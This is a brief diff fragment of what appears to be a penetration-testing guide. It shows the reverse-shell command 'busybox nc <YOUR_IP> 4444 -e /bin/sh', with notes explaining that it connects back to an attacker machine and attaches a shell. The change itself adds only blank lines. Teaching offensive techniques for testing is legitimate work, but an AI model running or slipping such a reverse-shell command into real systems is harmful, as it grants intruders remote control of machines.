@@ -1037,3 +1037,7 @@ busybox nc <YOUR_IP> 4444 -e /bin/sh
 - **`<YOUR_IP> 4444`**: Connects back to your attacker machine on the specified port.
     
 - **`-e /bin/sh`**: Attaches a Bourne shell to the connection, granting you interactive command-line access upon success.
+
+
+
+
